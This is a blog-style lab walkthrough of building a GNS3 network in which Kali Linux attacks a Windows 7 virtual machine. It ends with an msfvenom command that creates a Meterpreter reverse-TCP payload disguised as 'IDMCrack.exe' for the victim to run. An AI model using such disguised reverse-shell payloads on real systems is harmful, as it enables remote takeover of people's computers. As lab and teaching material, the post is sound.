---
title: Accessing the victim’s computer using the Msvenom
author: Nishal Rai
date: 2022-08-17 20:55:00 +0800
categories: [Offensive]
tags: [getting started]
---

Before we begin the practical assessment of the attack by using Msvenom which is a Metasploit framework, we need to understand the actual work going behind the attack. We are trying to access the victim’s computer which is currently running Windows 7 as Operating System.This practical assessment will be conducted by creating a virtual environment within the computer and then configuring each and every necessary device within the virtual environment. To perform this remote access control hacking using Msvenom, we need to install GNS3, VMWare or VirtualBox which will host any Linux distros (Kali Linux, Parrot OS & other) – I will be using Kali Linux 2020 and then a victim’s computer where Windows 7 is used for this assessment.When you have installed GNS3 on your computer then you need to make a simple topology as shown in the figure to carry out the operation.


Here, we place a router as a Core Router which is linked up with ISP and then a Core Switch connected with two end-users: Kali Linux as an attacker and Windows 7 as a victim within the same network. However, in real-life scenario, attacker may not be present in the same network of victim but can even build remote access to the victim’s computer using the port forwarding technique.The attack will be carried out once all the devices within the virtual environment are carried out. Initially, router is configured with the following values as displayed below:


Here, interface f0/0 is assigned 10.10.10.1/24 network address which has as a 10.10.10.1 ip address and 255.255.255.0 as a subnet mask. Interface f0/1 is assigned 192.168.108.128.Similarly, the end devices Windows 7 (victim) is assigned 10.10.10.15/24 and Kali Linux (attacker) is assigned as 10.10.254/24. Here, both the end devices will have 10.10.10.1 as a default gateway in order to communicate with the core router as shown in the above illustrated figure.Once all the configuration of the devices is configured then try to ping the end devices with another device such as:Windows 7 ping successful with the Core Router and Kali Linux OS:



Kali Linux successfully pings Windows 7 and Core Router:



Then a script is developed using Msvenom which is a Metasploit Framework:




```
Msf5> msfvenom -p windows / meterpreter / reverse tcp LHOST=10.10.10.254 LPORT=5555 -f exe -o /home/kali/Desktop/IDMCrack.exe
```

A executable file is developed and will be saved in the desktop of Kali Linux. Then the file should be run into the victim computer and a session will be established between the victim’s pc (Windows 7) and Kali Linux (attacker) which enables the attacker to perform various possible attacks over victim’s pc.